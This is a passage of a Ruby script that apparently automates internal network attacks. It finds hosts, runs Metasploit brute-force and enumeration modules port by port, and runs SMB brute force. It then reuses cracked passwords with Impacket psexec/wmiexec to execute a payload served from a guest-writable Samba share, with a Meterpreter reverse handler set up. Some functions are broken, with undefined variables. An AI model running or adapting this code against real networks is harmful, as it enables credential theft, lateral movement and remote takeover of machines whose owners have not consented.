			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==8834
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []														
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_login"
			exploitList << "use auxiliary/scanner/nessus/nessus_xmlrpc_ping"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==9000
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/admin/http/axigen_file_access"
			exploitList << "use auxiliary/scanner/misc/raysharp_dvr_passwords"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==9084
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/http/vmware_update_manager_traversal"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end	
		if port==9100
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/printer/printer_download_file"
			exploitList << "use auxiliary/scanner/printer/printer_env_vars"
			exploitList << "use auxiliary/scanner/printer/printer_list_dir"
			exploitList << "use auxiliary/scanner/printer/printer_list_volumes"
			exploitList << "use auxiliary/scanner/printer/printer_ready_message"
			exploitList << "use auxiliary/scanner/printer/printer_version_info"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==9200
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/elasticsearch/indeces_enum"
			exploitList << "use auxiliary/scanner/elasticsearch/indices_enum"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==10001	
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/admin/zend/java_bridge"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==11211
			puts "nmap -p 11211 --script membase-brute -iL hosts_port11211.txt"
		end
		if port==13364
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/misc/rosewill_rxs3211_passwords"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==17185
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/vxworks/wdbrpc_bootline"
			exploitList << "use auxiliary/scanner/vxworks/wdbrpc_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end
		if port==27017	
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/mongodb/mongodb_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end			
		end
		if port==32764
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/misc/sercomm_backdoor_scanner"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end

		if port==49152
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []									
			exploitList << "use auxiliary/scanner/http/smt_ipmi_49152_exposure"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
			
		end
		if port==50000	
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []									
			exploitList << "use auxiliary/scanner/db2/db2_auth"
			exploitList << "use auxiliary/scanner/db2/db2_version"
			exploitList << "use auxiliary/scanner/db2/discovery"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end

		if port==50013
			preMsf = "setg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port '+port.to_s+' against: '+ipAddr,Color.clear,"\n"
			exploitList = []						
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_abaplog"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_brute_login"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_extractusers"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getenv"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getlogfiles"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getprocesslist"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_instanceproperties"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_listlogfiles"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_startprofile"
			exploitList << "use auxiliary/scanner/sap/sap_mgmt_con_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
	end
end

def initiateMetasploit()
	puts "[*] Initiating Metasploit..."
	results = ""
	cmd = "spool /tmp/msfconsole1.log"
	opts = {:user=>"msf", :pass=>"msf", :port=>55553}
	rpc  = Msf::RPC::Client.new(opts)
	if rpc.token
	        puts "[*] Sucessfully authenticated to the server"
	else
			puts "[!] Unable to authenticated to server"
	end
	consoleList = rpc.call('console.list')
	if consoleList["consoles"].length==0
		rpc.call('console.create')
	end
	i=0
	consoleList = rpc.call('console.list')
	while i<consoleList["consoles"].length
		if consoleList["consoles"][i]["id"]=="0"			
			rpc.call('console.write','0',cmd)
			while rpc.call('console.list')["consoles"][0]["busy"]==true
				puts "[*] Sleeping for 10 seconds"
				sleep(10)
			end
		end
		i+=1
	end
end

def runMetasploit(cmd)
	results = ""
	#msfrpcd -U msf -P msf -p 55553 -f
	#or load msgrpc User=msf Pass=msf
	opts = {:user=>"msf", :pass=>"msf", :port=>55553}
	rpc  = Msf::RPC::Client.new(opts)
	#$stdout.puts "[*] The RPC client is available in variable 'rpc'"
	if rpc.token
	        puts "[*] Sucessfully authenticated to the server"
	        #$stdout.puts "[*] Sucessfully authenticated to the server"
	else
			puts "[!] Unable to authenticated to server"
	end
	consoleList = rpc.call('console.list')
	if consoleList["consoles"].length==0
		rpc.call('console.create')
	end
	i=0
	consoleList = rpc.call('console.list')
	while i<consoleList["consoles"].length
		if consoleList["consoles"][i]["id"]=="0"			
			rpc.call('console.write','0',cmd)
			while rpc.call('console.list')["consoles"][0]["busy"]==true
				puts "[*] Sleeping for 10 seconds"
				sleep(10)
			end
			results = rpc.call("console.read",i)["data"]
		end
		i+=1
	end
	return results
end

=begin
def runSMB(ipAddr)
	print Color.green,Color.bold,'[*] Runs msf_smb_version against: '+ipAddr,Color.clear,"\n"
	cmd = "use auxiliary/scanner/smb/smb_version\nset rhosts "+ipAddr+"\nrun\n"
	results = runMetasploit(cmd)
	resultsLine = results.split("\n")
	count=0
	for x in resultsLine
		if x.include? "is running"
			#puts x
			print Color.green,Color.bold,x,Color.clear,"\n"
		end	
		count+=1
	end			
end	
=end

def run_cmd(cmd)
    stdin, stdout, stderr = Open3.popen3(cmd)
    return stdout.readlines
end

def timeout_cmd(command,timeout)
    cmd_output = []
    begin
        status = Timeout.timeout(timeout) do
            p = IO.popen(command) do |f|
                f.each_line do |g| 
                    cmd_output << g 
                end
            end
        end
	return cmd_output
    rescue Timeout::Error
	#puts "Timeout: "+command
        return cmd_output
    end
end

def mask_2_ciddr(mask)
   return "/" + mask.split(".").map { |e| e.to_i.to_s(2).rjust(8, "0") }.join.count("1").to_s
end

def chunk(string, size)
    return string.scan(/.{1,#{size}}/)
end

def createDatabase()
	filename = 'database.db'
	if !File.exist?(filename)
	  	db = SQLite3::Database.new( 'database.db' )
  		begin
  			db.execute("CREATE TABLE hosts (id INTEGER PRIMARY KEY,macAddr VARCHAR(255), ipAddr VARCHAR(100), nbnsName VARCHAR(100), gotAccess VARCHAR(1), runScan VARCHAR(1)) ");
		 	db.execute("CREATE TABLE passwords (id INTEGER PRIMARY KEY, ipHost VARCHAR(255), type VARCHAR(100), hash VARCHAR(300), username VARCHAR(100), plainText VARCHAR(100), crackStatus VARCHAR(1), runJohn VARCHAR(1)) ");
		 	db.execute("CREATE TABLE testedPasswords (id INTEGER PRIMARY KEY, ipHost VARCHAR(255), username VARCHAR(100), password VARCHAR(100)) ");
		rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
			db.close
		end
	end
end

def setup()
	print Color.green,Color.bold,'[*] Setting up',Color.clear+"\n"
	#initiateMetasploit()

	#Check if msfrpcd is running
	cmd = "screen -list | grep rpcdscreen"
	results = run_cmd(cmd)
	if results.length<1
		cmd = "screen -dmS rpcdscreen"
		run_cmd(cmd)
		cmd = "screen -S rpcdscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfrpcd -U msf -P msf -p 55553\n'"
		run_cmd(cmd)
	else
		cmd = "killall msfrpcd"
		results = run_cmd(cmd)
		
		cmd = "ps aux | grep msfrpcd | grep -v grep | awk '{print $2}'"
		results = run_cmd(cmd)
		if results.length<1
			cmd = "screen -S rpcdscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfrpcd -U msf -P msf -p 55553\n'"
			results = run_cmd(cmd)
			if $verbose==true
				puts results
			end
		end
	end

	#Check if psexec and wmiexec exists
	if not File.exist?("wmiexec.py") or not File.exist?("psexec.py")
		print Color.red,Color.bold,'[!] Either wmiexec.py or psexec.py is missing. Please check....',Color.clear+"\n"
		exit
	end
	#Check if /etc/samba/smb.conf is modified
	cmd = "grep smb_share /etc/samba/smb.conf"
	results = run_cmd(cmd)
	if results.length<1
		open('/etc/samba/smb.conf', 'a') do |f|
  			f << "[smb_share]\n"
  			f << "browseable = no\n"
  			f << "path = /var/smb_share\n"
  			f << "guest ok = yes\n"
  			f << "read only = no\n"
		end		
	end
	cmd = "mkdir /var/smb_share"
	run_cmd(cmd)
	cmd = "/etc/init.d/samba restart"
	run_cmd(cmd)

	if $enableVeil==true
		generateVeil()
	else
		#here
		cmd = " cp "+$executableName+" /var/smb_share"
		run_cmd(cmd)
	end

	#File.open("meterpreter1.rc", 'w') { |file| 
	#	if msfLog.length>0
	#		file.write("spool "+msfLog+"\n") 
	#	else
	#		file.write("") 
	#	end
	#	file.write("use multi/handler\n") 
	#	file.write("set AutoRunScript multi_console_command -rc autorunCmd.rc\n")
	#	file.write("set payload windows/meterpreter/reverse_https\n") 
	#	file.write("set ExitOnSession false\n")
	#	file.write("set LHOST "+local_ip)
	#	file.write("set LPORT 8443\n")
	#	file.write("exploit -j -z\n")
	#}	
	cmd = "screen -list | grep msfscreen"
	results = run_cmd(cmd)
	if results.length<1
		cmd = "screen -dmS msfscreen"
		run_cmd(cmd)
		cmd = "screen -S msfscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n'"
		puts cmd
		run_cmd(cmd)
	else
		cmd = "ps aux | grep msfconsole | grep -v grep | awk '{print $2}'"
		results = run_cmd(cmd)
		msfRunning = false
		if results.length>0
			msfRunning = true
		else
			cmd = "screen -S msfscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n'"
			run_cmd(cmd)
			puts "[*] Sleeping for 30 seconds to wait for Metasploit to start"
			sleep(30)
		end
	end
end

def getGateway()
	cmd = "/sbin/ip route | awk '/default/ { print $3 }'"
	gateway = timeout_cmd(cmd,15)[0]
end

def getMacAddress(ipAddr)
	x = PacketFu::ARPPacket.new(:ï¬‚avor => "Windows")
	x.eth_saddr=Mac.addr
	x.eth_daddr="ff:ff:ff:ff:ff:ff"
	x.arp_saddr_ip=local_ip
	x.arp_saddr_mac=Mac.addr 
	x.arp_daddr_ip=ipAddr
	x.arp_daddr_mac="00:00:00:00:00:00"
	x.arp_opcode=1
	x.to_w('eth0') 
end

def runNmap(ipAddr)
	targetIP = ipAddr
	puts "[*] Checking for open 445/tcp port on host "+targetIP
	#print Color.green,Color.bold,'[*] Checking for open 445/tcp port on host '+targetIP,Color.clear+"\n"
 	filename = 'scan_'+ipAddr+'.xml'
	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
     	broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
       	cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
	output = IO.popen(cmd)
	netmask = output.readlines
	netmask = (netmask[0]).gsub("Mask:","").to_s
	netmask = netmask[0..(netmask.size-1)].to_s
	cidr = mask_2_ciddr(netmask)	
	ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
	if not File.exist?(filename)
		cmd = 'nmap -Pn -sT -n -p 445 '+targetIP+' --open -oX '+filename
		timeout=120
		timeout_cmd(cmd,timeout)
		portListTmp=[]
		Nmap::XML.new(filename) do |xml|
 		 	xml.each_host do |host|
    			puts "[#{host.ip}]"
				host.each_port do |port|
					if port.state!='filtered' and port.state!='closed'
						print Color.green,Color.bold,'[*] Open 445/tcp port found on: '+targetIP,Color.clear+"\n"
						#puts "[*] Open 445/tcp port found on: "+targetIP
      					#puts "  #{port.number}/#{port.protocol}\t#{port.state}\t#{port.service}"
						portListTmp<<port.number
					end
				end
    		end
  		end
		return portListTmp
	else
		portListTmp=[]
		Nmap::XML.new(filename) do |xml|
			xml.each_host do |host|
    				#puts "[#{host.ip}]"
				host.each_port do |port|
					if port.state!='filtered' and port.state!='closed'
						print Color.green,Color.bold,'[*] Open 445/tcp port found on: '+targetIP,Color.clear+"\n"
	     				#puts "  #{port.number}/#{port.protocol}\t#{port.state}\t#{port.service}"
						portListTmp<<port.number
					end
    			end
  			end
		end
		return portListTmp
	end
end

def findHosts()
	loop{
	       	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
       		broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
        	cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
		output = IO.popen(cmd)
		netmask = output.readlines
		netmask = (netmask[0]).gsub("Mask:","").to_s
		netmask = netmask[0..(netmask.size-1)].to_s
		cidr = mask_2_ciddr(netmask)	
		ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
   		cidr4 = NetAddr::CIDR.create(ipRange+cidr)
		puts "[*] Finding Hosts: "+ipRange+cidr
		cmd = 'nmap -PR -n -sn '+ipRange+cidr+' -oX arp_scan.xml'
		timeout=15
		timeout_cmd(cmd,timeout)
		#Nmap::XML.new('arp_scan.xml') do |xml|
  		#	xml.each_host do |host|
    		#		puts "[#{host.ip}]"
    		#	end
  		#end
		sleep(60)
	}
end

def checkNewPasswords()
	loop{
		puts "[*] Checking for new passwords in database"
		smbList = []
		begin
	    	db = SQLite3::Database.open "database.db"
			stmt = db.prepare "SELECT ipAddr from hosts WHERE gotAccess=?"
			stmt.bind_param 1,0 
			rs = stmt.execute
			while (row = rs.next) do
				smbList << row[0]
			end
		rescue SQLite3::Exception => e 
	    		puts "Exception occured"
	    		puts e
	    ensure
			stmt.close if stmt
	    	db.close if db
		end
		for host in smbList
			ipAddr = host
			if port_open?(host, 445, 10)
				updateDB=false

				passwordList = []
				begin
			    	db = SQLite3::Database.open "database.db"
					stmt = db.prepare "SELECT ipHost, username, plainText from passwords WHERE crackStatus=1"
					rs = stmt.execute
					while (row = rs.next) do
						ipHostList = row[0]
						if not ipHostList[host]
							puts "[+} Extracting password from database: "
							updateDB=true
							passwordList << row[1]+" "+row[2]
							username = row[1]
							password = row[2]
						end
					end
				rescue SQLite3::Exception => e 
			    		puts "Exception occured"
			    		puts e
			    ensure
					stmt.close if stmt
			    	db.close if db
				end

				if updateDB==true
					begin
						db1 = SQLite3::Database.open "database.db"
						stmt1 = db1.prepare "update passwords set ipHost=? where username=? and plainText=?"
						tmpStr = ipHostList+" "+ipAddr
						stmt1.bind_param 1, tmpStr
						stmt1.bind_param 2, username
						stmt1.bind_param 3, password								
						rs1 = stmt1.execute
					rescue SQLite3::Exception => e 
			    		puts "Exception occured"
			    		puts e
			    	ensure
						stmt1.close if stmt1
			    		db1.close if db1
					end
				end
				if passwordList.length>0
					print Color.green,Color.bold,'[*] Testing the credentials against : '+ipAddr,Color.clear,"\n"
					puts passwordList

					for i in passwordList
						username = i.split(" ")[0]
						password = i.split(" ")[1]
						print Color.green,Color.bold,'[*] Runs smbclient (Username: '+username+' Password:'+password+') : '+ipAddr,Color.clear,"\n"
						cmd = "smbclient -L //"+ipAddr+" -N -U '"+username+"%"+password+"'"
						result = run_cmd(cmd)
						puts result
						logonFailure = false
						for x in result
							if x.include? "NT_STATUS_LOGON_FAILURE"
								print Color.red,Color.bold,'[!] Incorrect username or password (Username: '+username+' Password: '+password+'): '+ipAddr,Color.clear,"\n"
								logonFailure=true
							end
						end
						if logonFailure==false
							#Not completed
							cmd = "ps aux | grep msfconsole | grep -v grep | awk '{print $2}'"
							results = run_cmd(cmd)
							msfRunning = false
							#here
							if results.length>0
								msfRunning = true
							end

							print Color.green,Color.bold,'[*] Runs Impacket psexec.py or/and wmiexec.py scripts (Username: '+username+" Password:"+password+') : '+ipAddr,Color.clear,"\n"
							if $executableName.length>0
								cmd1 = "python2.7 psexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\"+$executableName
								cmd2 = "python2.7 wmiexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\"+$executableName
							else
								cmd1 = "python2.7 psexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\sce.32.exe"
								cmd2 = "python2.7 wmiexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\sce.32.exe"
							end
							completed=false
							if $verbose==true
								results = run_cmd(cmd1)
								puts results
							else
								results = run_cmd(cmd1)
								for x in results
									if x.include?"finished with ErrorCode: 0" 
										print Color.red,Color.bold,'[*] psexec.py script ran successfully: '+ipAddr,Color.clear,"\n"
										completed=true
									end
									if x.include?"STATUS_LOGON_FAILURE"
										print Color.red,Color.bold,'[!] Incorrect username or password ('+username+'%'+password+'): '+ipAddr,Color.clear,"\n"
										#puts '[!] Incorrect username or password ('+username+'%'+password+'): '+ipAddr
									end
								end
								#timeout_cmd(cmd1,15)
							end
							if completed==false
								if $verbose==true
									results = run_cmd(cmd2)
									puts results
								else	
									results = run_cmd(cmd2)
								end
							end
							#timeout_cmd(cmd2,30)
						end
					end
				end
			end
		end

		sleep(60)
	}
end

def runScan()
	$blackList<<getGateway()
	loop{
		if $scanList.length>0
			$scanList.each{|x| 
				$scanList.delete(x)
				found=false
				for y in $blackList
					if y.strip.eql?x.strip
						found=true
					end
				end
				if found==false
				#if not $blackList.include?(x.strip)
				#	puts x.strip.eql?$blackList[0].strip
					portList=runNmap(x)
					if portList.length>0
						#Tasks to run after detecting host in network
						#runMsf(x,portList)
						for y in portList
							if y==445
								print Color.green,Color.bold,"[*] Running nmap smb-brute.nse and enum4linux.pl against: ",x,Color.clear,"\n"
								cmd1 = "nmap --script smb-brute.nse -p445 "+x+" | tee -a results.txt"
								cmd2 = "perl /pentest/enum4linux.pl -a "+x+" | tee -a results.txt"
								if $verbose==true
									puts run_cmd(cmd1)
									puts run_cmd(cmd2)
								else
									run_cmd(cmd1)
									run_cmd(cmd2)
								end
								#runSMB(x)
							end
						end
					end
				end
			}
		end
		sleep(5)
	}
end


def updateHostNBNS(nbnsName,ipAddr)
	begin
		db1 = SQLite3::Database.open "database.db"
		stmt1 = db1.prepare "update hosts set nbnsName=? where ipAddr=?"
		stmt1.bind_param 1, nbnsName
		stmt1.bind_param 2, ipAddr
		rs1 = stmt1.execute
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end
end

def findMac(macAddr)
	rows = ''
	begin
  		macAddr = macAddr.strip()

    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT macAddr from hosts WHERE macAddr=?"
		stmt.bind_param 1, macAddr
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end
	if not rows.nil?
		if rows.length>0
			return true
		else
			return false
		end
	else
		return false
	end
end
def updateHost(macAddr,ipAddr)
	rows = ''
	begin
  		macAddr = macAddr.strip()
		ipAddr = ipAddr.strip()

    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT ipAddr from hosts WHERE macAddr=?"
		stmt.bind_param 1, macAddr
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end
	begin
	   	db1 = SQLite3::Database.open "database.db"
		if rows.nil?
			print Color.green,Color.bold,"[*] New Device Found - "+ipAddr+" (Mac: "+macAddr+")",Color.clear,"\n"
			stmt1 = db1.prepare "insert into hosts (macAddr,ipAddr,runScan) VALUES (?,?,0)"
			stmt1.bind_param 1, macAddr
			stmt1.bind_param 2, ipAddr
			rs1 = stmt1.execute
		else
			if rows[0]!=ipAddr
				puts "old: "+rows[0]+" new: "+ipAddr.to_s
				puts "[*] Change in IP address (IP: "+ipAddr+") (Mac: "+macAddr+")"
				stmt1 = db1.prepare "update hosts set ipAddr=? where macAddr=?"
				stmt1.bind_param 1, ipAddr
				stmt1.bind_param 2, macAddr
				rs1 = stmt1.execute
			end
		end
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end
end

def local_ip
  cmd =  'echo `ifconfig eth0 | grep \'inet addr:\'|grep -o -P \'(?<=addr:).*(?=Bcast)\'`'
  output = run_cmd(cmd)
  return output[0]
end

def nmblookup(ipAddr)
  command = "arp"
  macAddr = ''
  p = IO.popen(command) do |f|
  	f.each_line do |g| 
		if g.include? ipAddr 
			macAddr = (g.split(" ").map(&:strip))[2]
		end
       	end
  end

  #Get Mac Address of IP Address
  udp_pkt = PacketFu::UDPPacket.new
  udp_pkt.eth_dst = "\xff\xff\xff\xff\xff\xff"

  #Randomize Source Port
  udp_pkt.udp_src=137
  udp_pkt.udp_dst=137

  udp_pkt.ip_saddr=local_ip
  udp_pkt.ip_daddr=macAddr
  nbns_tranID = "\x80\x0a"
  nbns_flags  = "\x00\x00"
  nbns_questions = "\x00\x01"
  nbns_answers = "\x00\x00"
  nbns_authority = "\x00\x00"
  nbns_additional = "\x00\x00"
  nbns_queriesNbstat = '\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00'
  nbns_queriesType="\x00\x21"
  nbns_queriesClass="\x00\x01"

  udp_pkt.payload=nbns_tranID+nbns_flags+nbns_questions+nbns_answers+nbns_authority+nbns_additional<<encodedHex<<nbns_quriesNbstat<<nbns_queriesType<<nbns_queriesClass
  udp_pkt.recalc
  #udp_pkt.to_f('/mnt/hgfs/tmp/udp.pcap')
  puts "[*] Sent NBSTAT Query: "+hostName
  udp_pkt.to_w("eth0")
end

def getNetBIOS(ipAddr)
	Socket.do_not_reverse_lookup = false  
	puts Socket.getaddrinfo(ipAddr, nil)[0][2]      
end

def sendNetBIOS(hostName)
  charLookup = { "A"=>"EB", "B"=>"EC", "C"=>"ED", "D"=>"EE", "E"=>"EF", "F"=>"EG", "G"=>"EH", "H" =>"EI", "I" =>"EJ", "J" =>"EK", "K" =>"EL", "L" =>"EM", "M" =>"EN", "N" =>"EO", "O" =>"EP", "P" =>"FA", "Q" =>"FB", "R" =>"FC", "S" =>"FD", "T" =>"FE", "U" =>"FF", "V" =>"FG", "W" =>"FH", "X" =>"FI", "Y" =>"FJ", "Z" =>"FK", "0" =>"DA", "1" =>"DB", "2" =>"DC", "3" =>"DD", "4" =>"DE", "5" =>"DF", "6" =>"DG", "7" =>"DH", "8" =>"DI", "9" =>"DJ", " " =>"CA", "!" =>"CB", "$" =>"CE", "%" =>"CF", "&" =>"CG", "'" =>"CH", "(" =>"CI", ")" =>"CJ", "*" =>"CK", "+" =>"CL", "," =>"CM", "-" =>"CN", "." =>"CO", "=" =>"DN", ":" =>"DK", ";" =>"DL", "@" =>"EA", "^" =>"FO", "_" =>"FP", "{" =>"HL", "}" =>"HN", "~" =>"HO"}
  ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
